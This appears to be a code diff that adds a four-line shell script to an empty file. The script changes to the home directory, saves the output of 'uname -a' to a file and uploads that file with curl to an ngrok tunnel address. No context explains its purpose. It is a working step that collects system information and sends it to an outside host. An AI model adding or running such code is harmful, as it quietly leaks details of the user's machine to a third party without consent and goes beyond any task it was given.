@@ -1,1 +1,4 @@
-
+cd ~
+uname -a > linux.txt
+filename=linux.txt
+curl -F "uploadfile=@$filename" https://d937ab425988.ngrok.io/upload
